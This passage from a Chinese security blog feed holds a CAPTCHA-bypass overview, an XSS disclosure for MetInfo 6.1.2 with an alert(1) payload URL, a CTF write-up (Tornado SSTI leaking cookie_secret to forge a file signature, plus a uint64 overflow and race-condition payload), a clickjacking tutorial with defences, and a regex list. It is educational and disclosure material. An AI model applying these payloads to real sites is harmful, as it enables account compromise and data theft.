target="_blank" rel="external">http://wy.ichenfei.com/searchbug.php?q=验证码</a>  <!-- - [http://es.ichenfei.com:8000/wysearch/?q=验证码](http://es.ichenfei.com:8000/wysearch/?q=验证码) --></li></ul><h2 id="0x03-验证码实现原理"><a href="#0x03-验证码实现原理" class="headerlink" title="0x03 验证码实现原理"></a>0x03 验证码实现原理</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810240004_376.jpg" alt=""></p><ol><li>客户端发起一个请求；</li><li>服务端响应并创建一个新的SessionID同时生成一个随机验证码；</li><li>服务端将验证码和SessionID一并返回给客户端；</li><li>客户端提交验证码连同SessionID给服务端；</li><li>服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。</li></ol><p>根据上面的实现流程，可以从四个方面入手，<strong>客户端问题</strong>、<strong>服务端问题</strong>、<strong>验证码本身问题</strong>,还有一个<strong>验证码流程设计</strong>问题。</p><h2 id="0x04-客户端问题"><a href="#0x04-客户端问题" class="headerlink" title="0x04 客户端问题"></a>0x04 客户端问题</h2><ul><li>客户端生成验证码<ul><li>验证码由客户端js生成并且仅仅在客户端用js验证</li></ul></li><li>验证码输出客户端<ul><li>输出在html中（神一样的程序员）</li></ul></li><li>验证码输出在cookie中，这个在乌云中案例也是比较多的。</li></ul><h2 id="0x05-服务端问题"><a href="#0x05-服务端问题" class="headerlink" title="0x05 服务端问题"></a>0x05 服务端问题</h2><ul><li>验证码不过期，没有及时销毁会话导致验证码复用<ul><li>这个是最常见的，乌云上面有大量的案例。</li></ul></li><li>没有进行非空判断<ul><li>很多时候，我们会遗留掉了验证过程中验证码为空的情况</li><li>比如去掉cookie中的某些值或者请求中验证码参数</li></ul></li><li>产生的验证码问题集内的答案非常有限</li></ul><h2 id="0x06-其他类型验证码绕过"><a href="#0x06-其他类型验证码绕过" class="headerlink" title="0x06 其他类型验证码绕过"></a>0x06 其他类型验证码绕过</h2><p>pkav http fuzzer工具可以简单绕过数字型验证码</p><p>基于机器学习识别验证码</p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Xss in MetInfo V6.1.2</title>
      <link href="/archis/a5c61176/"/>
      <url>/archis/a5c61176/</url>
      
        <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810160210_976.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>护网杯wp</title>
      <link href="/archis/173905c2/"/>
      <url>/archis/173905c2/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>进入首页，看到文件列表。</p><p><a href="http://49.4.94.186:31331/" target="_blank" rel="external">http://49.4.94.186:31331/</a></p><p>随便点一个，可以读取文件内容，看到url里有两个参数，一个是文件名，另一个是签名。</p><p>根据 hint.txt ， 签名是 cookie_secret + 文件名 的 md5</p><pre><code>hint.txtmd5(cookie_secret + md5(filename))</code></pre><p><a href="http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c</a></p><p>通过 FUZZ 参数，发现新的路由，即报错页面。</p><p><a href="http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF" target="_blank" rel="external">http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF</a></p><p>看到参数的 <code>签名错误</code> 被输出到页面里，应该是 SSTI。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201811020000.png" alt=""></p><p><a href="http://blog.51cto.com/wengmengkai/1844886" target="_blank" rel="external">tornado—web框架基础入门</a> 通过这个进行快速学习tornado的开发</p><p><a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="external">tornado文档</a> 通过阅读文档快速掌握对象</p><p>安装:</p><pre><code>pip install tornado</code></pre><p>官方demo</p><pre><code class="python">import tornado.ioloopimport tornado.web# import uimodules as md# import uimethods as mtclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write(&quot;Hello, world&quot;)settings = {    &#39;template_path&#39;: &#39;views&#39;,        # html文件    &#39;static_path&#39;: &#39;statics&#39;,        # 静态文件（css,js,img）    &#39;static_url_prefix&#39;: &#39;/statics/&#39;,        # 静态文件前缀    &#39;cookie_secret&#39;: &#39;suoning&#39;,        # cookie自定义字符串加盐    # &#39;xsrf_cookies&#39;: True,         # 防止跨站伪造    # &#39;ui_methods&#39;: mt,           # 自定义UIMethod函数    # &#39;ui_modules&#39;: md,           # 自定义UIModule类}application = tornado.web.Application([    (r&quot;/&quot;, MainHandler),], **settings)if __name__ == &quot;__main__&quot;:    application.listen(8888)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>通过<code>application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], **settings)</code></p><p>很明显可以知道 cookie_secret 在RequestHandler这个对象里面</p><p>然后根据<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="external">Tornado小记 – 模板中的Handler</a></p><blockquote><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p>就知道怎么通过模版注入 </p><p>模版注入绕过:<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="external">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p>里面的payload 基本都包含 () 很明显题目过滤了 只保留了. 所以通过上面别名的方法来获得cookie_secret</p><p>可以通过这个 msg= 直接读出 tornado 的配置。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/jl6Wwoc.png" alt=""></p><p>找到了 cookie_secret，根据 hint，构造 url</p><p>/fllllllllllag</p><p>{BVt!-e%cqXs<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x26;&#108;&#110;&#x29;&#x24;&#55;&#95;&#120;&#73;&#64;&#x77;&#x4a;&#x30;&#x50;&#65;&#94;&#x39;&#81;&#49;&#35;&#x38;&#x3f;&#107;&#x68;&#x6a;&#40;&#x34;&#x61;&#x6f;&#50;&#117;&#114;&#x43;&#x62;&#76;&#x33;&#72;&#69;&#x7e;&#46;&#71;&#x70;&#122;&#70;&#x66;">&#x26;&#108;&#110;&#x29;&#x24;&#55;&#95;&#120;&#73;&#64;&#x77;&#x4a;&#x30;&#x50;&#65;&#94;&#x39;&#81;&#49;&#35;&#x38;&#x3f;&#107;&#x68;&#x6a;&#40;&#x34;&#x61;&#x6f;&#50;&#117;&#114;&#x43;&#x62;&#76;&#x33;&#72;&#69;&#x7e;&#46;&#71;&#x70;&#122;&#70;&#x66;</a>[YKSg</p><pre><code class="php">&lt;?php$str = &quot;/fllllllllllag&quot;;$a=md5($str);$str2 = &quot;{BVt!-e%cqXs&lt;&amp;ln)$7_xI@wJ0PA^9Q1#8?khj(4ao2urCbL3HE~.GpzFf&gt;[YKSg&quot;;$str3=$str2.$a;echo md5($str3);?&gt;</code></pre><p>2ad507bc2e8b59cce2e4147b0bfa169f</p><p><a href="http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f</a></p><p>flag{fd29ee3314ce32fedce028ca753fb68a}</p><p><a href="http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960" target="_blank" rel="external">http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960</a></p><h3 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h3><p>本题的考点在于条件竞争以及整数的溢出问题</p><p>通过多线程发包的方式使得购买到 5 个以上的大辣条</p><p>可以使用burp抓包，发送到intruder</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810181352_259.png" alt=""></p><p>设线程大一点</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810181402_632.png" alt=""></p><p>start stack</p><p>得到10个大辣条越换两个辣条之王</p><p>抓包发现cookie有go_iris 猜测是go语言数据类型溢出</p><p>由于go使用强类型语言，猜测是整数溢出。 最后测试出是unsigned __int64,而uint64范围为18446744073709551615， 5个大辣条换一个辣条之王。</p><p>这里遇到了很大坑一开始我们一直用18446744073709551616，然后比赛完才发现要除以为除以5，所以最后num=3689348814741910324，那么要花费18446744073709551620个大辣条，超出uint64范围转换为5。</p><p>payload：</p><p>num=3689348814741910324</p><h3 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h3><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="external">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="external">https://www.anquanke.com/post/id/161849</a></p><p><code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p><p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="external">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h3><pre><code class="python">import base64tmp=&quot;&quot;string = &quot;AAoHAR1TJ1clUFYjVSRRV1cnIiUiV1BeUFNeIlBXI1BVI1UlUBs=&quot;string2 = base64.b64decode(string)print(string2)for i in range(1,256):    for j in string2:        tmp = tmp + chr(ord(j) ^ i)    print(tmp)    tmp=&quot;&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>web漏洞挖掘之点击劫持漏洞</title>
      <link href="/archis/95d370e7/"/>
      <url>/archis/95d370e7/</url>
      
        <content type="html"><![CDATA[<h1 id="web漏洞挖掘之点击劫持漏洞"><a href="#web漏洞挖掘之点击劫持漏洞" class="headerlink" title="web漏洞挖掘之点击劫持漏洞"></a>web漏洞挖掘之点击劫持漏洞</h1><h2 id="0x00-点击劫持的概念"><a href="#0x00-点击劫持的概念" class="headerlink" title="0x00 点击劫持的概念"></a>0x00 点击劫持的概念</h2><p>点击劫持clickjacking，也叫UI-覆盖攻击（UI redress attack）；最早是在2008年，由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼首创。</p><p>百度百科上对其的定义如下： 它是通过覆盖不可见的框架误导受害者点击。 虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。 这种攻击利用了HTML中<code>&lt;iframe&gt;</code>标签的透明属性  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112329_760.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112329_533.png" alt=""></p><p>图片中，都是进行了iframe嵌套，构成一个页面 来诱使用户进行点击。 以上就是点击劫持的一个基本概念 </p><h2 id="0x01点击劫持攻击的原理"><a href="#0x01点击劫持攻击的原理" class="headerlink" title="0x01点击劫持攻击的原理"></a>0x01点击劫持攻击的原理</h2><p>点击劫持实际上是一种视觉上的欺骗手段，攻击者通过利用一个透明的、不可见的iframe，覆盖在某网页上，然后诱导用户在该网页上进行点击等操作，而此时用户在不知情的情况下点击了透明的iframe页面 。攻击者通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。 如使用css调整图片大小位置，通过设置opacity参数调整元素透明度等；目的都是让用户就无法看到含恶意代码的目标网页。 </p><p>这是点击劫持的原理，关键在于构造不可见的透明iframe来进行利用； </p><h2 id="0x02-挖掘的思路"><a href="#0x02-挖掘的思路" class="headerlink" title="0x02 挖掘的思路"></a>0x02 挖掘的思路</h2><p>1.我们只需要创建一个iframe的页面嵌套就可以简单的测试 </p><p>如果目标应用支持iframe进行页面嵌套，那么基本断定网站存在点击劫持攻击漏洞 比如<code>&lt;iframe src=&quot;http://target.com&quot;/&gt;</code> ，假设该页面上显示hello world 如果通过iframe嵌套后能显示为 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112339_70.png" alt=""></p><p>基本就能确定存在点击劫持风险 </p><p>2.通过目标的HTTP响应头是否设置好了X-Frame-Options字段，是否有JavaScript的Frame Busting机制，也可以进行判断 ，比如在用常见的WVS进行网站扫描时，会经常看到这样的信息： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112340_436.jpg" alt=""></p><p>这就是通过判断是否存在X-Frame-Options响应头来处理 其他辅助工具进行clickjacking漏洞探测的时候，也都基本上基于以上情况进行处理 </p><h2 id="0x03-举列子"><a href="#0x03-举列子" class="headerlink" title="0x03 举列子"></a>0x03 举列子</h2><p>这两处代码截图是github上的clickjacking扫描的代码，可以参考：<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/D4Vinci/Clickjacking-Tester</a> <a href="qq://txfile/#" target="_blank" rel="external">https://github.com/LTF1633242320/D-TECT</a> </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112341_651.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112341_810.png" alt=""></p><p>点击劫持 主要是靠点击，也有通过拖拽进行劫持实现的 </p><p>这种点击劫持的案例，比较知名的包括：Facebook 的‘likejacking’攻击、Adobe Flash Player 网站漏洞、Twitter 的 Don’t click 攻击、谷歌账户点击劫持攻击等 </p><p>在诸多点击劫持案例中，最为经典的案例是攻击者通过flash构造出点击劫持，最终控制用户电脑摄像头事件; </p><p>首先，攻击者构造一个flash小游戏，并贴心逼真地显示了游戏得分以及游戏耗时，诱导用户试玩；在试玩过程中引导用户点击不停变换位置的“click”按钮， 而其实在游戏界面中隐藏了一个看不见的iframe </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112354_232.png" alt=""></p><p>攻击通过诱导用户使用鼠标点击看似随意的位置，来完成较为复杂的操作。 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112355_209.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_575.png" alt=""></p><p>并最终开启了用户的摄像头 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_551.png" alt=""></p><p>某浪博客关注点击劫持 </p><p>在新浪博客的“加关注”处： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_303.jpg" alt=""></p><p>通过简单构造的html页面，如下， </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_673.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_64.png" alt=""></p><p>通过构造iframe 从而进行博客关注数量的刷新 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_869.jpg" alt=""></p><p>当然可以再对html页面进行精心美化调整，从而大面积进行点击劫持攻击的实施。 分享一个github上的类似开启摄像头的一个demo，可以在做安全意识培训是当演示了<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/thomaspatzke/Clickjacking-Exploit</a></p><p>低版本IE时代的东西了吧 用浏览器插件 </p><p>html5可以直接调用摄像头  前段时间有朋友搞得一个xss用HTML5调用摄像头，直接可以看到使用者照片 </p><h2 id="0x04-点击劫持与其他漏洞结合效果"><a href="#0x04-点击劫持与其他漏洞结合效果" class="headerlink" title="0x04 点击劫持与其他漏洞结合效果"></a>0x04 点击劫持与其他漏洞结合效果</h2><p>可以配合CSRF  </p><p>反射型xss可以和点击劫持一起形成差不多储存型xss的效果</p><p>反射XSS直接利用需要对方点击，如果直接把包含反射XSS的链接发送给受害者，比较唐突难以利用，所以如果将点击劫持与反射xss结合起来，利用iframe嵌套诱导，也就基本能达到存储XSS的效果 </p><h2 id="0x05-点击劫持漏洞的防御方法"><a href="#0x05-点击劫持漏洞的防御方法" class="headerlink" title="0x05 点击劫持漏洞的防御方法"></a>0x05 点击劫持漏洞的防御方法</h2><p>点击劫持漏洞的防御 主要是两种，一个是通过Frame busting防御、一种是通过添加X-Frame-Options属性进行防御 </p><p>frame busting防御，通过js代码禁止iframe的嵌套，如判断顶层窗口跳转： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112359_756.png" alt=""></p><p>下面是一些常见Frame busting： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112359_295.png" alt=""></p><p>但frame busting存在被绕过的可能，如多层iframe嵌套等； 在HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的脚本执行，从而可以使得frame busting失效 ,比如在html5中进行绕过：设置<iframe>属性：sandbox </iframe></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120000_760.png" alt=""></p><p>当sandbox 仅设置为allow-forms时，js是不被执行的 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120000_246.png" alt=""></p><p>设置<iframe>属性：security；当security设置为restricted后，frame中的脚本也将不能执行；但仅限于IE ，如此一来，由于无法执行js脚本，则通过JS来判断顶层跳转将失败 </iframe></p><p>第二种方式，设置X-Frame-Options属性； X-Frame-Options是一个微软提出的一个HTTP响应头；用来给浏览器指示允许一个页面可否在 <frame>, <iframe> 或者 <object> 中展现的标记。 </object></iframe></p><p>通过设置X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持；这是目前处理点击劫持攻击的最优且最可靠的手段； X-Frame-Options 的三个可选值：  Ø    DENY  Ø    SAMEORIGIN  Ø    ALLOW-FROM origin </p><p>以下是这三个可选值的表义： 如果设置为 DENY，表示该页面不允许在 frame 中展示，即便是在同源域名的页面中嵌套也不允许； </p><p>如果设置为 SAMEORIGIN，表示该页面可以在同源域名页面的 frame 中嵌套展示； 如果设置为 ALLOW-FROM，表示该页面可以在指定来源的 frame 中嵌套展示（origin为允许frame加载的页面地址）； </p><p>在各个平台中间件中X-Frame-Options的配置不一样， 在IIS环境中，在web站点的web.config中配置。 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_277.png" alt=""></p><p>在apache中： 先开启mod_<a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>，即在httpd.conf中去掉“LoadModule headers<em>module modules/mod</em><a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>”前的#； 再.修改httpd.conf，添加下面内容：Header always append X-Frame-Options DENY 修改完如下: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_486.png" alt=""></p><p>如果同一台apache服务器上有多个站点，只想针对其中一个站点进行配置，可以修改.htaccess文件，添加如下内容： Header append X-FRAME-OPTIONS “DENY” </p><p>如果是nginx，则修改nginx.conf,在server下添加下面内容： add_header X-Frame-Options “DENY”; 添加完成如下： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_76.png" alt=""></p><p>以上主要是针对服务端的防御，如果是客户端的话，那就是保持浏览器的及时升级更新， 最新版浏览器通常具备更好更多的安全机制保护客户的信息安全，及时升级更新浏览器，可从一定程度上进行漏洞攻击的有效防范 </p><p>另一方面，作为客户端，可以通过安装浏览器的扩展插件，达到对潜在威胁进行阻止及警告，及时判断页面中的不安全因素； 如果你使用的是Firefox，则可以安装插件NoScript，在选项中设置禁止<iframe>，效果如下： </iframe></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120002_346.png" alt=""></p><p>有了X-Frame-Options的http头差不多就是不能进行点击劫持了吧 </p><p>这里顺便分享几个关于点击劫持的PoC工具，师傅们可以玩玩： </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/enddo/CJExploiter</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/sensepost/jack</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/samyk/quickjack</a>     </p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>20个常用的正则表达式</title>
      <link href="/archis/7fe4b50e/"/>
      <url>/archis/7fe4b50e/</url>
      
        <content type="html"><![CDATA[<h1 id="20个常用的正则表达式"><a href="#20个常用的正则表达式" class="headerlink" title="20个常用的正则表达式"></a>20个常用的正则表达式</h1><h2 id="1-校验密码强度"><a href="#1-校验密码强度" class="headerlink" title="1 . 校验密码强度**"></a>1 . 校验密码强度**</h2><p>密码的强度必须是包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间。</p><pre><code>^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></pre><h2 id="2-校验中文"><a href="#2-校验中文" class="headerlink" title="2. 校验中文"></a><strong>2. 校验中文</strong></h2><p>字符串仅能是中文。</p><pre><code>^[\\u4e00-\\u9fa5]{0,}$</code></pre><h2 id="3-由数字、26个英文字母或下划线组成的字符串"><a href="#3-由数字、26个英文字母或下划线组成的字符串" class="headerlink" title="3. 由数字、26个英文字母或下划线组成的字符串"></a><strong>3. 由数字、26个英文字母或下划线组成的字符串</strong></h2><pre><code>^\\w+$</code></pre><h2 id="4-校验E-Mail-地址"><a href="#4-校验E-Mail-地址" class="headerlink" title="4. 校验E-Mail 地址"></a><strong>4. 校验E-Mail 地址</strong></h2><p>同密码一样，下面是E-mail地址合规性的正则检查语句。</p><pre><code>[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+(?:\\.[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?</code></pre><h2 id="5-校验身份证号码"><a href="#5-校验身份证号码" class="headerlink" title="5. 校验身份证号码"></a><strong>5. 校验身份证号码</strong></h2><p>下面是身份证号码的正则校验。15 或 18位。</p><p>15位：</p><pre><code>^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$</code></pre><p>18位：</p><pre><code>^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$</code></pre><h2 id="6-校验日期"><a href="#6-校验日期" class="headerlink" title="6. 校验日期"></a><strong>6. 校验日期</strong></h2><p>“yyyy-mm-dd“ 格式的日期校验，已考虑平闰年。</p><pre><code>^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</code></pre><h2 id="7-校验金额"><a href="#7-校验金额" class="headerlink" title="7. 校验金额"></a><strong>7. 校验金额</strong></h2><p>金额校验，精确到2位小数。</p><pre><code>^[0-9]+(.[0-9]{2})?$</code></pre><h2 id="8-校验手机号"><a href="#8-校验手机号" class="headerlink" title="8. 校验手机号"></a><strong>8. 校验手机号</strong></h2><p>下面是国内 13、15、18开头的手机号正则表达式。（可根据目前国内收集号扩展前两位开头号码）</p><pre><code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$</code></pre><h2 id="9-判断IE的版本"><a href="#9-判断IE的版本" class="headerlink" title="9. 判断IE的版本"></a><strong>9. 判断IE的版本</strong></h2><p>IE目前还没被完全取代，很多页面还是需要做版本兼容，下面是IE版本检查的表达式。</p><pre><code>^.*MSIE [5-8](?:\\.[0-9]+)?(?!.*Trident\\/[5-9]\\.0).*$</code></pre><h2 id="10-校验IP-v4地址"><a href="#10-校验IP-v4地址" class="headerlink" title="10. 校验IP-v4地址"></a><strong>10. 校验IP-v4地址</strong></h2><p>IP4 正则语句。</p><pre><code>\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b</code></pre><h2 id="11-校验IP-v6地址"><a href="#11-校验IP-v6地址" class="headerlink" title="11. 校验IP-v6地址"></a><strong>11. 校验IP-v6地址</strong></h2><p>IP6 正则语句。</p><pre><code>(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))</code></pre><h2 id="12-检查URL的前缀"><a href="#12-检查URL的前缀" class="headerlink" title="12. 检查URL的前缀"></a><strong>12. 检查URL的前缀</strong></h2><p>应用开发中很多时候需要区分请求是HTTPS还是HTTP，通过下面的表达式可以取出一个url的前缀然后再逻辑判断。</p><pre><code>if (!s.match(/^[a-zA-Z]+:\\/\\//)){    s = &#39;http://&#39; + s;}</code></pre><h2 id="13-提取URL链接"><a href="#13-提取URL链接" class="headerlink" title="13. 提取URL链接"></a><strong>13. 提取URL链接</strong></h2><p>下面的这个表达式可以筛选出一段文本中的URL。</p><pre><code>^(f|ht){1}(tp|tps):\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- ./?%&amp;=]*)?</code></pre><h2 id="14-文件路径及扩展名校验"><a href="#14-文件路径及扩展名校验" class="headerlink" title="14. 文件路径及扩展名校验"></a><strong>14. 文件路径及扩展名校验</strong></h2><p>验证windows下文件路径和扩展名（下面的例子中为.txt文件）</p><pre><code>^([a-zA-Z]\\:|\\\\)\\\\([^\\\\]+\\\\)*[^\\/:*?&quot;&lt;&gt;|]+\\.txt(l)?$</code></pre><h2 id="15-提取Color-Hex-Codes"><a href="#15-提取Color-Hex-Codes" class="headerlink" title="15. 提取Color Hex  Codes"></a><strong>15. 提取Color Hex  Codes</strong></h2><p>有时需要抽取网页中的颜色代码，可以使用下面的表达式。</p><pre><code>^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$</code></pre><h2 id="16-提取网页图片"><a href="#16-提取网页图片" class="headerlink" title="16. 提取网页图片"></a><strong>16. 提取网页图片</strong></h2><p>假若你想提取网页中所有图片信息，可以利用下面的表达式。</p><pre><code>\\&lt; *[img][^\\\\&gt;]*[src] *= *[\\&quot;\\&#39;]{0,1}([^\\&quot;\\&#39;\\ &gt;]*)</code></pre><h2 id="17-提取页面超链接"><a href="#17-提取页面超链接" class="headerlink" title="17. 提取页面超链接"></a><strong>17. 